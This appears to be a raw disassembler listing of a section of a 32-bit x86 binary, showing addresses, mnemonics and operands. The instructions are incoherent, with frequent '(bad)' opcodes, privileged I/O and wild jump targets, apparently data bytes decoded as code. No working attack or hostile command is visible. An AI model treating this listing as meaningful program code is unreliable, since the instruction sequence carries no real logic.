  417a8d:	fld    TBYTE PTR [ecx]
  417a8f:	jno    0x417a6a
	...
  417af1:	add    BYTE PTR [eax],al
  417af3:	add    BYTE PTR [edi],ch
  417af5:	stos   DWORD PTR es:[edi],eax
  417af6:	cdq    
  417af7:	inc    ecx
  417af8:	popf   
  417af9:	jae    0x417afa
  417afb:	out    dx,eax
  417afc:	(bad)  [eax]
  417afe:	xor    ebx,DWORD PTR [ecx+0x33d2e87]
  417b04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b05:	cli    
  417b06:	add    BYTE PTR [eax],al
  417b08:	add    eax,0xd000001
  417b0d:	cli    
  417b0e:	cmp    BYTE PTR [ebp-0x7d78fee9],al
  417b14:	jb     0x417b84
  417b16:	data16 ds cmc 
  417b19:	sti    
  417b1a:	push   ebp
  417b1b:	or     BYTE PTR [ecx-0x75],0x44
  417b1f:	jg     0x417ac8
  417b21:	or     ecx,DWORD PTR [edx-0x499a8256]
  417b27:	loope  0x417abd
  417b29:	mov    ebx,ebx
  417b2b:	imul   esi,DWORD PTR [esi],0xb3d13cf3
  417b31:	adc    DWORD PTR [edx-0x6b0a783e],edx
  417b37:	xchg   esi,eax
  417b38:	or     DWORD PTR [eax-0x2a],edi
  417b3b:	ror    BYTE PTR [esi],cl
  417b3d:	pop    esp
  417b3e:	pop    esp
  417b3f:	arpl   WORD PTR [ecx],dx
  417b41:	ss mov dl,0x72
  417b44:	in     al,0x1b
  417b46:	add    BYTE PTR ds:0x24c5ae53,ch
  417b4c:	xchg   esi,eax
  417b4d:	sub    DWORD PTR [ebp-0x6],ebx
  417b50:	pop    edx
  417b51:	sub    al,0xc3
  417b53:	sub    BYTE PTR [esp+edx*2],ch
  417b56:	pop    ebx
  417b57:	xchg   edi,eax
  417b58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b59:	pop    edx
  417b5a:	stos   BYTE PTR es:[edi],al
  417b5b:	sub    al,0x17
  417b5d:	into   
  417b5e:	xchg   edx,eax
  417b5f:	jmp    0xcc14b6d8
  417b64:	lea    esi,[ecx]
  417b66:	jmp    0x417b93
  417b68:	outs   dx,BYTE PTR ds:[esi]
  417b69:	cmc    
  417b6a:	fbstp  TBYTE PTR [ecx+esi*2-0x58]
  417b6e:	mov    ds,WORD PTR [ebp-0x28]
  417b71:	nop
  417b72:	test   BYTE PTR [edi+0x4e],ch
  417b75:	out    0xa8,al
  417b77:	mov    BYTE PTR [edx+eax*2-0x53e58104],dh
  417b7e:	dec    eax
  417b7f:	pop    eax
  417b80:	jmp    0xe1314d81
  417b85:	jne    0x417bae
  417b87:	ins    BYTE PTR es:[edi],dx
  417b88:	mov    eax,DWORD PTR [ecx+0x59]
  417b8b:	jb     0x417b6c
  417b8d:	push   ebx
  417b8e:	loope  0x417b8e
  417b90:	iret   
  417b91:	cmp    al,0xcf
  417b93:	mov    ebx,0x30515615
  417b98:	std    
  417b99:	and    al,BYTE PTR [eax]
  417b9b:	mov    edi,0x423f9dd0
  417ba0:	test   DWORD PTR [ecx+0x40ca9aa],ecx
  417ba6:	jge    0x417c0d
  417ba8:	call   0xb1d7071c
  417bad:	int3   
  417bae:	aad    0xe3
  417bb0:	cmp    cl,BYTE PTR [ebx+0x3f]
  417bb3:	dec    ecx
  417bb4:	push   0xffffffa6
  417bb6:	scas   eax,DWORD PTR es:[edi]
  417bb7:	jecxz  0x417bb5
  417bb9:	ret    0x7f83
  417bbc:	dec    ebx
  417bbd:	jne    0x417b9c
  417bbf:	sbb    al,0x4c
  417bc1:	mov    al,0x8e
  417bc3:	dec    esp
  417bc4:	inc    BYTE PTR [ecx+ebx*1]
  417bc7:	inc    esi
  417bc8:	xor    cl,BYTE PTR [edx-0x68644922]
  417bce:	and    DWORD PTR [edi],edx
  417bd0:	push   ecx
  417bd1:	add    al,0xf
  417bd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417bd4:	push   0xab0f7c58
  417bd9:	sar    BYTE PTR fs:[esi-0x2c6cf9b0],1
  417be0:	adc    esp,DWORD PTR [esi+0x28]
  417be3:	mov    al,0x80
  417be5:	sub    eax,0x42634dd4
  417bea:	adc    BYTE PTR [edi],dl
  417bec:	add    BYTE PTR [ebx-0x3d8c4560],0x4a
  417bf3:	cmp    edi,ebx
  417bf5:	lds    eax,FWORD PTR [esi]
  417bf7:	arpl   sp,cx
  417bf9:	mul    BYTE PTR [esi+eiz*8]
  417bfc:	loop   0x417c5f
  417bfe:	xor    ebx,DWORD PTR [edx-0x4a]
  417c01:	les    eax,FWORD PTR [ecx]
  417c03:	sbb    DWORD PTR [ecx+ebx*2],ebx
  417c06:	push   ebp
  417c07:	lods   al,BYTE PTR ds:[esi]
  417c08:	mov    bh,BYTE PTR ds:0x5320c8ae
  417c0e:	or     al,0x0
  417c10:	int    0x0
	...
  417c72:	add    BYTE PTR [eax],al
  417c74:	mov    eax,eax
  417c76:	nop
  417c77:	test   cl,bl
  417c79:	aam    0x9d
  417c7b:	int    0x75
  417c7d:	aaa    
  417c7e:	das    
  417c7f:	aam    0x5f
  417c81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c82:	ret    
  417c83:	loopne 0x417c2e
  417c85:	sti    
  417c86:	add    BYTE PTR [eax],al
  417c88:	add    eax,0x4a000001
  417c8d:	js     0x417c7a
  417c8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c90:	ds pop edi
  417c92:	inc    edx
  417c93:	jae    0x417cd9
  417c95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c96:	call   0x9498c00a
  417c9b:	scas   eax,DWORD PTR es:[edi]
  417c9c:	or     eax,0xeed8fa74
  417ca1:	scas   eax,DWORD PTR es:[edi]
  417ca2:	lahf   
  417ca3:	push   0x84a4f990
  417ca8:	ret    0xf150
  417cab:	aam    0x9b
  417cad:	(bad)  
  417cae:	fist   WORD PTR [ebp-0xc2a2688]
  417cb4:	dec    ecx
  417cb5:	cmp    BYTE PTR [ecx+0xc06db60],0xd9
  417cbc:	pop    ebp
  417cbd:	loope  0x417d09
  417cbf:	inc    edx
  417cc0:	mov    cl,0x2c
  417cc2:	sbb    cl,bl
  417cc4:	mov    ch,BYTE PTR [esp+ebp*2+0x463ed43a]
  417ccb:	jno    0x417c8f
  417ccd:	out    dx,eax
  417cce:	cmp    al,BYTE PTR [edx]
  417cd0:	cli    
  417cd1:	inc    ebx
  417cd2:	pop    ss
  417cd3:	jae    0x417c94
  417cd5:	mov    edx,0xd958c59
  417cda:	fnstsw WORD PTR [ecx]
  417cdc:	xor    BYTE PTR [edi-0x51],ah
  417cdf:	cdq    
  417ce0:	xlat   BYTE PTR ds:[ebx]
  417ce1:	in     eax,dx
  417ce2:	ficomp WORD PTR [esi-0x18]
  417ce5:	and    BYTE PTR [esi],al
  417ce7:	mov    ebx,0x25beade7
  417cec:	pushf  
  417ced:	js     0x417c95
  417cef:	(bad)  
  417cf0:	dec    esi
  417cf1:	or     bh,BYTE PTR [ebp-0x4960c1a3]
  417cf7:	mov    bh,0x3a
  417cf9:	and    BYTE PTR [ecx],al
  417cfb:	xchg   edx,eax
  417cfc:	addr16 imul edi,edx,0x5cd547ef
  417d03:	xchg   dl,ah
  417d05:	cmp    BYTE PTR [ebx-0x6e],bh
  417d08:	inc    edx
  417d09:	add    ebx,DWORD PTR [esi+eiz*4+0x1b]
  417d0d:	addr16 jne 0x417d10
  417d10:	imul   esi,DWORD PTR [edx],0x7597ecbd
  417d16:	push   esp
  417d17:	cli    
  417d18:	mov    eax,DWORD PTR [eax+0x44]
  417d1b:	and    DWORD PTR [eax+0x1e],0xd4e9dc38
  417d22:	mov    BYTE PTR ds:0xdf467b18,al
  417d28:	std    
  417d29:	mov    al,0x17
  417d2b:	mov    ?,WORD PTR [ebx+0x71]
  417d2e:	rcl    DWORD PTR [edx-0x73],1
  417d31:	xor    DWORD PTR [ebx-0x392d4fb7],0xffffffbd
  417d38:	xchg   ebx,eax
  417d39:	imul   eax,DWORD PTR [edi],0x85de5473
  417d3f:	and    BYTE PTR [edx+ebx*2-0x51e6ee0e],dh
  417d46:	sub    ch,ch
  417d48:	jno    0x417cea
  417d4a:	push   0x43
  417d4c:	js     0x417d38
  417d4e:	es cmp cl,ah
  417d51:	sbb    esi,DWORD PTR [esi+edx*1+0x1a]
  417d55:	xchg   ch,ah
  417d57:	cld    
  417d58:	mov    BYTE PTR [ecx-0x7abfe04b],bl
  417d5e:	pusha  
  417d5f:	add    al,0x43
  417d61:	mov    dh,0xa2
  417d63:	push   edi
  417d64:	psubsb mm6,QWORD PTR [eax+0x903bff0]
  417d6b:	sub    eax,eax
  417d6d:	aas    
  417d6e:	into   
  417d6f:	dec    ecx
  417d70:	xor    eax,0xb094ad48
  417d75:	jb     0x417d38
  417d77:	(bad)  
  417d78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d79:	shl    DWORD PTR [edx],1
  417d7b:	sbb    ebx,DWORD PTR [ebx]
  417d7d:	bound  esp,QWORD PTR [edi+0xc]
  417d80:	and    al,bl
  417d82:	xor    ah,BYTE PTR ds:0xde148a5
  417d88:	imul   esi,DWORD PTR [edx-0x322cc7d9],0x663229
	...
  417df2:	add    BYTE PTR [eax],al
  417df4:	pop    ss
  417df5:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417dfb:	addr16 dec esi
  417dfd:	sub    BYTE PTR [ecx+0x46],ch
  417e00:	inc    esi
  417e01:	aas    
  417e02:	mov    al,ds:0xfcae2b
  417e07:	add    BYTE PTR ds:0xe000001,al
  417e0d:	mov    ds:0x87540650,eax
  417e12:	ret    
  417e13:	mov    bl,0x7
  417e15:	pop    ebx
  417e16:	inc    ecx
  417e17:	outs   dx,BYTE PTR ds:[esi]
  417e18:	call   0xe96a36ec
  417e1d:	push   ecx
  417e1e:	pop    ss
  417e1f:	repnz ror BYTE PTR [edx],1
  417e22:	into   
  417e23:	mov    dh,0xf8
  417e25:	mov    ds:0xf187f83c,eax
  417e2a:	mov    eax,ds:0x721a6e9c
  417e2f:	dec    edi
  417e30:	sub    eax,0xa9270d19
  417e35:	xor    al,0xe8
  417e37:	ret    
  417e38:	cmp    al,0x61
  417e3a:	popa   
  417e3b:	scas   eax,DWORD PTR es:[edi]
  417e3c:	sub    bh,BYTE PTR [esi+edx*1-0x1b]
  417e40:	jmp    0x2fa4864c
  417e45:	push   edx
  417e46:	lahf   
  417e47:	jge    0x417e8c
  417e49:	or     DWORD PTR [edi-0x55e1e2bf],ebp
  417e4f:	pop    esp
  417e50:	pop    esi
  417e51:	retf   0xe09f
  417e54:	imul   esp,DWORD PTR [ebp+eax*1-0x48],0x3e
  417e59:	sbb    eax,DWORD PTR [ebx]
  417e5b:	xor    eax,0x7ae88542
  417e60:	imul   ebx,edi,0x16ac362c
  417e66:	ret    
  417e67:	mov    eax,0x54b523f7
  417e6c:	jb     0x417e4c
  417e6e:	popa   
  417e6f:	push   0xffffffc9
  417e71:	and    cl,0x17
  417e74:	sub    al,0xd7
  417e76:	adc    ebx,DWORD PTR [eax+ebx*2-0x36b342b1]
  417e7d:	pop    eax
  417e7e:	or     ecx,esp
  417e80:	sbb    al,0x7a
  417e82:	mul    esi
  417e84:	sbb    eax,0x19ea422c
  417e89:	jae    0x417ea5
  417e8b:	mov    esp,0xfe2984e3
  417e90:	imul   ecx,DWORD PTR [ebp+0x71],0xffffffa1
  417e94:	jmp    0xa6a0eeae
  417e99:	ror    BYTE PTR [ecx-0x16],cl
  417e9c:	jl     0x417ea8
  417e9e:	sbb    ah,0xa6
  417ea1:	cmp    cl,BYTE PTR [ebx]
  417ea3:	out    dx,eax
  417ea4:	scas   al,BYTE PTR es:[edi]
  417ea5:	mov    dh,0x45
  417ea7:	in     eax,dx
  417ea8:	xor    bh,BYTE PTR [edx+0x6d0b125b]
  417eae:	pop    ss
  417eaf:	or     dl,bl
  417eb1:	and    DWORD PTR [edi-0x2caa736a],ebp
  417eb7:	sbb    eax,0xa9fca2d2
  417ebc:	or     BYTE PTR [esi+0x6e],dl
  417ebf:	inc    edx
  417ec0:	popa   
  417ec1:	xor    BYTE PTR [edx+0x5a],dh
  417ec4:	mov    BYTE PTR [ecx+ebx*1+0x61],ch
  417ec8:	xor    ebp,DWORD PTR [ebx+edx*4-0x45]
  417ecc:	pop    edx
  417ecd:	or     ebx,eax
  417ecf:	or     DWORD PTR ds:0xc23bc614,esi
  417ed5:	add    eax,esi
  417ed7:	fild   DWORD PTR [ecx-0x3ecf85c1]
  417edd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ede:	adc    BYTE PTR [eax-0x79],ah
  417ee1:	je     0x417ec5
  417ee3:	or     eax,DWORD PTR [edx+eax*8]
  417ee6:	mov    al,0x1c
  417ee8:	nop    DWORD PTR [eax+0x23]
  417eec:	ins    DWORD PTR es:[edi],dx
  417eed:	adc    BYTE PTR [edi],bl
  417eef:	test   ebx,0x911e425a
  417ef5:	pop    ss
  417ef6:	pop    edi
  417ef7:	pop    ds
  417ef8:	inc    ecx
  417ef9:	out    0x5d,eax
  417efb:	call   0x6d5d5293
  417f00:	das    
  417f01:	push   ebx
  417f02:	push   0x58
  417f04:	xor    bh,BYTE PTR [esi+0x7a861c4b]
  417f0a:	mov    ebx,ebp
  417f0c:	pop    esp
  417f0d:	dec    eax
  417f0e:	xchg   BYTE PTR [ecx+0x97],bh
	...
  417f74:	(bad)  
  417f75:	out    0xe6,al
  417f77:	cmp    esp,esi
  417f79:	cmp    edi,edi
  417f7b:	push   DWORD PTR [edx]
  417f7d:	xchg   edx,eax
  417f7e:	xor    al,bh
  417f80:	retf   
  417f81:	call   0xfdf4fcc1
  417f86:	add    BYTE PTR [eax],al
  417f88:	add    eax,0x81000001
  417f8d:	nop
  417f8e:	jno    0x417f64
  417f90:	(bad)  
  417f92:	lods   al,BYTE PTR ds:[esi]
  417f93:	jmp    0x8feb86ae
  417f98:	cmp    edx,DWORD PTR [ecx-0x1b]
  417f9b:	inc    BYTE PTR [ecx-0x5f]
  417f9e:	mov    DWORD PTR [eax-0x309070ac],esp
  417fa4:	outs   dx,BYTE PTR ds:[esi]
  417fa5:	(bad)  
  417fa6:	arpl   WORD PTR [ebx+0x34584e9a],bp
  417fac:	lods   al,BYTE PTR ds:[esi]
  417fad:	push   0xeef9aa50
  417fb2:	or     dl,bl
  417fb4:	aam    0x17
  417fb6:	lods   eax,DWORD PTR ds:[esi]
  417fb7:	jb     0x417f9c
  417fb9:	dec    edx
  417fba:	sub    DWORD PTR [ebx+0x5d887919],edx
  417fc0:	push   0x7c
  417fc2:	and    dl,BYTE PTR [esi+0x6f0a6905]
  417fc8:	repnz sub DWORD PTR [ebp-0x7f4c2e38],0xce9fb180
  417fd3:	leave  
  417fd4:	jecxz  0x417f5a
  417fd6:	arpl   si,cx
  417fd8:	push   0x731ec46a
  417fdd:	loop   0x417f81
  417fdf:	add    DWORD PTR [edi+ebx*4+0x11],0xffffffeb
  417fe4:	test   al,0x8
  417fe6:	mov    dl,0x22
  417fe8:	inc    edi
  417fe9:	(bad)  
  417feb:	ja     0x41803e
  417fed:	push   ebx
  417fee:	inc    ecx
  417fef:	in     eax,0xfe
  417ff1:	pop    eax
  417ff2:	jne    0x41803a
  417ff4:	pop    ds
  417ff5:	xchg   ebx,eax
  417ff6:	sbb    BYTE PTR [esi],ah
  417ff8:	mov    cl,0xc1
  417ffa:	xor    al,0x87
  417ffc:	add    dh,dl
  417ffe:	mov    ds:0x35db2c77,eax
  418003:	neg    BYTE PTR [ecx+edi*2]
  418006:	sti    
  418007:	sbb    al,0xa7
  418009:	inc    ecx
  41800a:	dec    edi
  41800b:	cld    
  41800c:	test   edi,0x897355df
  418012:	jo     0x418047
  418014:	int3   
  418015:	cmp    bl,BYTE PTR [edi-0x6a58fc98]
  41801b:	sbb    BYTE PTR [esi],al
  41801d:	rcr    DWORD PTR [edi-0x24ca62ba],0xcd
  418024:	out    dx,eax
  418025:	iret   
  418026:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418027:	mov    edi,DWORD PTR [edx-0x6d8e91c0]
  41802d:	adc    ch,BYTE PTR [ebp+ebx*2-0x35c1cb06]
  418034:	addr16 xchg esi,eax
  418036:	pop    DWORD PTR [edx+edx*2+0x6e061f74]
  41803d:	dec    ebp
  41803e:	jmp    0x418005
  418040:	std    
  418041:	sbb    ah,BYTE PTR [edi+edi*4-0x2e]
  418045:	xor    DWORD PTR [eax],edx
  418047:	lahf   
  418048:	aas    
  418049:	adc    ebp,0x1b904532
  41804f:	test   al,0x3
  418051:	xchg   BYTE PTR [edx+0x1a],ch
  418054:	xchg   edi,eax
  418055:	xor    al,0x88
  418057:	adc    al,dl
  418059:	aad    0xa3
  41805b:	fst    st(3)
  41805d:	add    eax,DWORD PTR [esi]
  41805f:	scas   eax,DWORD PTR es:[edi]
  418060:	mov    ah,0xd4
  418062:	and    eax,0xdf913d3a
  418067:	sbb    ebx,DWORD PTR [edi+0x644bcbb8]
  41806d:	sub    ch,dh
  41806f:	sub    eax,0x980fe492
  418074:	push   esp
  418075:	adc    ebx,esi
  418077:	push   ecx
  418078:	aad    0xa7
  41807a:	out    dx,eax
  41807b:	push   eax
  41807c:	fdivr  QWORD PTR [ecx]
  41807e:	ret    0x5d11
  418081:	push   cs
  418082:	jae    0x418008
  418084:	sub    cl,BYTE PTR [edi]
  418086:	cmp    ebx,ebx
  418088:	pop    ss
  418089:	mov    dh,0xd6
  41808b:	xchg   ebx,eax
  41808c:	stc    
  41808d:	mov    eax,ds:0xf755fe
	...
  4180f2:	add    BYTE PTR [eax],al
  4180f4:	test   eax,0xff456b7e
  4180f9:	push   ebp
  4180fa:	scas   eax,DWORD PTR es:[edi]
  4180fb:	(bad)  
  4180fc:	mov    ds:0x1a2fdebc,eax
  418101:	jmp    0xfefa7952
  418106:	add    BYTE PTR [eax],al
  418108:	add    eax,0x10000001
  41810d:	int3   
  41810e:	dec    edx
  41810f:	mov    ebp,0xf6dcaf13
  418114:	mov    ds:0xbdfc330b,al
  418119:	lods   eax,DWORD PTR ds:[esi]
  41811a:	les    edi,FWORD PTR [eax+0x2e]
  41811d:	fs add eax,0x9711db52
  418123:	enter  0xc857,0x8c
  418127:	sub    al,0x98
  418129:	out    0xef,eax
  41812b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41812c:	loop   0x418183
  41812e:	pop    ds
  41812f:	inc    edx
  418130:	xor    eax,0xdc18a859
  418135:	mov    al,0xb1
  418137:	popf   
  418138:	jecxz  0x41817e
  41813a:	dec    ebp
  41813b:	jmp    0x1e43e6f2
  418140:	inc    esp
  418141:	popa   
  418142:	push   edx
  418143:	fisttp WORD PTR [ecx-0x7363a496]
  418149:	pop    esi
  41814a:	or     DWORD PTR [ecx+edx*4+0x64742884],eax
  418151:	into   
  418152:	out    0xdf,al
  418154:	ret    0x24e4
  418157:	and    al,0x4d
  418159:	(bad)  
  41815b:	cld    
  41815c:	dec    edx
  41815d:	dec    edx
  41815e:	dec    edx
  41815f:	cwde   
  418160:	or     BYTE PTR [ebx+ecx*8-0x36],ch
  418164:	ret    0x2721
  418167:	aam    0x29
  418169:	cwde   
  41816a:	aad    0x92
  41816c:	jae    0x418161
  41816e:	fisttp QWORD PTR [edx-0xa575447]
  418174:	lds    edi,FWORD PTR [ebp+esi*8+0x47bf7df5]
  41817b:	test   eax,0x4491175d
  418180:	aas    
  418181:	aaa    
  418182:	scas   eax,DWORD PTR es:[edi]
  418183:	jne    0x4181ca
  418185:	sub    cl,0xe6
  418188:	es enter 0xc5fc,0x4a
  41818d:	out    dx,eax
  41818e:	(bad)  
  41818f:	addr16 popf 
  418191:	adc    eax,DWORD PTR [esi-0x14ec3a47]
  418197:	in     al,dx
  418198:	add    BYTE PTR [esi],0xf3
  41819b:	inc    ebx
  41819c:	iret   
  41819d:	into   
  41819e:	shr    BYTE PTR [eax],0x12
  4181a1:	mov    bh,0x30
  4181a3:	adc    BYTE PTR [ebx+edi*1+0x7d],0x36
  4181a8:	nop
  4181a9:	xor    bl,BYTE PTR [ebp+eax*2-0x1b]
  4181ad:	jg     0x4181bc
  4181af:	clc    
  4181b0:	push   0x20
  4181b2:	jmp    0x52b34e20
  4181b7:	adc    dh,BYTE PTR [eax-0x53]
  4181ba:	imul   DWORD PTR [eax+ebx*1-0x54]
  4181be:	xchg   ebp,eax
  4181bf:	push   ss
  4181c0:	push   cs
  4181c1:	clc    
  4181c2:	lods   al,BYTE PTR ds:[esi]
  4181c3:	sahf   
  4181c4:	mov    eax,ds:0xdc3dd0e
  4181c9:	sbb    DWORD PTR [ecx+eiz*2+0xe],edx
  4181cd:	mov    es:0xb810262d,eax
  4181d3:	js     0x4181d7
  4181d5:	cmp    BYTE PTR [esi+esi*1+0x3edf4f64],dl
  4181dc:	inc    esi
  4181dd:	xchg   ebp,eax
  4181de:	sbb    BYTE PTR [edx+eax*4-0x2409ee12],bl
  4181e5:	test   eax,0x84efd175
  4181ea:	jbe    0x418242
  4181ec:	pop    esi
  4181ed:	mov    al,0x95
  4181ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181f0:	cmp    ecx,DWORD PTR [ebp+0x16f0cd86]
  4181f6:	iret   
  4181f7:	retf   
  4181f8:	outs   dx,BYTE PTR ds:[esi]
  4181f9:	fist   WORD PTR [edx+0x48422898]
  4181ff:	xchg   BYTE PTR [eax+0x8c62691],ch
  418205:	and    al,0x2c
  418207:	fnsave [ebp+0x38]
  41820a:	mov    ch,0xc9
  41820c:	ror    DWORD PTR [esi+0x2a],0xe9
  418210:	xchg   BYTE PTR [eax],al
	...
  418272:	add    BYTE PTR [eax],al
  418274:	aaa    
  418275:	xchg   edx,eax
  418276:	and    al,0x83
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	mov    bh,0xb7
  41827b:	mov    dh,0x40
  41827d:	mov    ebx,0x8ccfb8d6
  418282:	stos   DWORD PTR es:[edi],eax
  418283:	xchg   esi,eax
  418284:	mov    ebp,0x50000ff
  418289:	add    DWORD PTR [eax],eax
  41828b:	add    BYTE PTR [ebp+0x2d],bl
  41828e:	lahf   
  41828f:	or     ebp,DWORD PTR [eax]
  418291:	test   al,0xcc
  418293:	inc    ecx
  418294:	cdq    
  418295:	or     eax,0xafc69ddf
  41829a:	fldcw  WORD PTR [ecx+0x4b]
  41829d:	cwde   
  41829e:	cdq    
  41829f:	cmp    eax,0xf48f58cf
  4182a4:	not    DWORD PTR [ecx-0x4d]
  4182a7:	loope  0x418303
  4182a9:	sub    bh,cl
  4182ab:	(bad)  
  4182ac:	jg     0x418267
  4182ae:	in     eax,dx
  4182af:	sbb    al,0xd6
  4182b1:	outs   dx,DWORD PTR ds:[esi]
  4182b2:	xchg   DWORD PTR [edi],ecx
  4182b4:	cmp    DWORD PTR [ebp-0x21],esi
  4182b7:	xchg   esi,eax
  4182b8:	repnz test BYTE PTR [ecx],bl
  4182bb:	xchg   DWORD PTR [ecx-0x1ac0f2a2],edx
  4182c1:	sbb    al,BYTE PTR [edx+0x2]
  4182c4:	hlt    
  4182c5:	or     DWORD PTR [eax],0x38
  4182c8:	cwde   
  4182c9:	in     eax,dx
  4182ca:	jbe    0x4182e1
  4182cc:	jnp    0x4182a4
  4182ce:	sub    al,0xef
  4182d0:	sahf   
  4182d1:	loope  0x418312
  4182d3:	push   ebx
  4182d4:	lea    dx,[edx-0x25add40c]
  4182db:	stc    
  4182dc:	mov    ds:0x39dde9cd,al
  4182e1:	call   DWORD PTR [ecx+0x46]
  4182e4:	jmp    0x4182a7
  4182e6:	dec    esi
  4182e7:	sti    
  4182e8:	push   ecx
  4182e9:	pop    ds
  4182ea:	jno    0x4182f8
  4182ec:	rcr    DWORD PTR [edx-0x37],1
  4182ef:	jle    0x4182cf
  4182f1:	loope  0x418300
  4182f3:	or     bl,0xe4
  4182f6:	xor    ebp,DWORD PTR [edx]
  4182f8:	stc    
  4182f9:	dec    edi
  4182fa:	ds inc eax
  4182fc:	jge    0x41836e
  4182fe:	cdq    
  4182ff:	cmp    al,0x3e
  418301:	retf   0xdee1
  418304:	clc    
  418305:	test   BYTE PTR [edi-0x50],bl
  418308:	adc    BYTE PTR [ecx+0x71],bl
  41830b:	repz repz push edi
  41830e:	test   BYTE PTR [eax-0x51],bh
  418311:	call   0xc0e3:0xa641d4c9
  418318:	or     BYTE PTR [edx-0x3],al
  41831b:	shr    ch,0x35
  41831e:	xchg   esi,eax
  41831f:	xchg   esp,eax
  418320:	loope  0x418320
  418322:	jmp    DWORD PTR [ebx]
  418324:	bound  esi,QWORD PTR [esi]
  418326:	jb     0x418334
  418328:	cmp    DWORD PTR [edi-0x16ecaea3],eax
  41832e:	lahf   
  41832f:	imul   ebx,DWORD PTR [edx+0x2b],0xd9d5452e
  418336:	shl    DWORD PTR [eax],0x32
  418339:	lds    ebp,FWORD PTR [esi]
  41833b:	adc    eax,0xc1af8a0e
  418340:	and    ch,ch
  418342:	or     dh,BYTE PTR [esi-0x24]
  418345:	iret   
  418346:	out    dx,eax
  418347:	test   al,0x67
  418349:	cmp    al,0xde
  41834b:	or     DWORD PTR [edi],ebp
  41834d:	loope  0x418397
  41834f:	xor    DWORD PTR [edx+0x5a],ebx
  418352:	inc    esi
  418353:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  418355:	push   edi
  418356:	pop    esi
  418357:	dec    edi
  418358:	rol    BYTE PTR [esi-0x26b3d245],cl
  41835e:	pop    ds
  41835f:	pop    ebx
  418360:	jns    0x418326
  418362:	jmp    0x1ac71c73
  418367:	mov    DWORD PTR [edx+0x5e],esp
  41836a:	stc    
  41836b:	retf   0x5f33
  41836e:	int3   
  41836f:	jmp    0x418344
  418371:	fist   WORD PTR [ecx+0x31]
  418374:	out    dx,eax
  418375:	test   DWORD PTR [eax+edi*2-0x43],edx
  418379:	iret   
  41837a:	(bad)  [ebp+0x31cef29]
  418380:	push   esi
  418381:	sbb    BYTE PTR [ecx],cl
  418383:	outs   dx,DWORD PTR ds:[esi]
  418384:	imul   edi,ecx,0xc
  418387:	or     edi,ecx
  418389:	add    eax,0xf4de1662
  41838e:	jo     0x418394
  418390:	lock add BYTE PTR [eax],al
	...
  4183f3:	add    ah,bl
  4183f5:	mov    bl,0x3f
  4183f7:	push   eax
  4183f8:	jg     0x4183d6
  4183fa:	(bad)  
  4183fb:	mov    edi,0x14d871ac
  418400:	sub    BYTE PTR [edx+0xc28ef0],ch
  418406:	add    DWORD PTR [eax],eax
  418408:	add    eax,0xc6000001
  41840d:	jmp    DWORD PTR [esi+0x5b9074a6]
  418413:	mov    BYTE PTR [ecx],cl
  418415:	test   BYTE PTR [ecx+0x59a95a64],ah
  41841b:	push   cs
  41841c:	clc    
  41841d:	iret   
  41841e:	adc    edi,DWORD PTR [edi+0x5610ac1c]
  418424:	adc    eax,0x31db2704
  418429:	mov    cl,0x40
  41842b:	cld    
  41842c:	xchg   esp,eax
  41842d:	out    dx,eax
  41842e:	cwde   
  41842f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418430:	cmp    al,0x1a
  418432:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418433:	or     DWORD PTR [ecx-0x48],eax
  418436:	lds    eax,FWORD PTR [edi]
  418438:	xlat   BYTE PTR ds:[ebx]
  418439:	cmp    al,0xbc
  41843b:	ss add eax,0x91fa054e
  418441:	je     0x4183e4
  418443:	nop
  418444:	arpl   WORD PTR [ebx-0x6a0e7ea4],di
  41844a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41844b:	scas   al,BYTE PTR es:[edi]
  41844c:	sar    bl,1
  41844e:	frstor [edx]
  418450:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418451:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418452:	aad    0xc1
  418454:	adc    dl,BYTE PTR ds:0x65ee69c5
  41845a:	arpl   WORD PTR [edx-0x64203c42],ax
  418460:	push   ss
  418461:	add    BYTE PTR [edx],bl
  418463:	xchg   esi,eax
  418464:	pop    ds
  418465:	mov    ah,0x1b
  418467:	dec    ecx
  418468:	push   esi
  418469:	xchg   esi,eax
  41846a:	adc    DWORD PTR [esi-0x49],ecx
  41846d:	adc    eax,0x12b964e
  418472:	or     eax,0x6cd11d03
  418477:	addr16 (bad) 
  418479:	mov    al,ds:0xce46d6d6
  41847e:	adc    ah,BYTE PTR [esi+0x2c]
  418481:	jns    0x41845a
  418483:	clc    
  418484:	mov    esp,0x754a3f71
  418489:	jbe    0x4184e0
  41848b:	sbb    edx,DWORD PTR ds:0xd3773651
  418491:	outs   dx,DWORD PTR ds:[esi]
  418492:	mov    ds:0x68d48ab9,al
  418497:	lea    ebp,[edi+ecx*1+0x51]
  41849b:	pop    ss
  41849c:	js     0x418506
  41849e:	jmp    0x418519
  4184a0:	add    edi,DWORD PTR [ecx+0x29dde783]
  4184a6:	imul   ebx,edx,0x2e587757
  4184ac:	pop    ecx
  4184ad:	jmp    0x283d7e7b
  4184b2:	mov    edx,0x7524df1c
  4184b7:	cdq    
  4184b8:	xor    esi,eax
  4184ba:	dec    edi
  4184bb:	jle    0x4184a9
  4184bd:	pop    esp
  4184be:	pop    es
  4184bf:	sub    al,0x95
  4184c1:	outs   dx,DWORD PTR ds:[esi]
  4184c2:	mov    edx,0x5b29d33
  4184c7:	mov    ds:0x2bfbae6,eax
  4184cc:	shr    BYTE PTR [esi],1
  4184ce:	lahf   
  4184cf:	and    al,0x32
  4184d1:	and    DWORD PTR ds:0x8c5f0d5a,ebx
  4184d7:	nop
